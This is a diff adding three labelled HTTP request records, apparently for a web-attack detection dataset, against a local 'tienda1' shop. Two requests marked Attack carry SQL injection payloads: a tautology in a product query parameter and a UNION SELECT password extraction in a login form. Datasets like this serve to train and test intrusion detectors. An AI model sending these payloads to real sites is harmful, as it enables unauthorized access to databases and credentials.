@@ -1,0 +1,43 @@
+Start - Id: 11044
+class: Attack
+GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2'+or+'1'%3D'1 HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-control: no-cache
+Accept: text/xml,application/xml
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Host: localhost:8080
+Cookie: JSESSIONID=372DDFCE584244AED285252827076DA6
+Connection: close
+
+null
+
+End - Id: 11044
+Start - Id: 7704
+class: Valid
+GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-control: no-cache
+Accept: image/png,*/*
+Host: localhost:8080
+Cookie: JSESSIONID=1DAB65B0324F0B760D56507C0FFCD929
+Connection: close
+
+null
+
+End - Id: 7704
+Start - Id: 9001
+class: Attack
+POST http://localhost:8080/tienda1/autenticar HTTP/1.1
+User-Agent: Mozilla/5.0
+Host: localhost:8080
+Cookie: JSESSIONID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+username=admin'+UNION+SELECT+password+FROM+users--&password=x
+
+End - Id: 9001
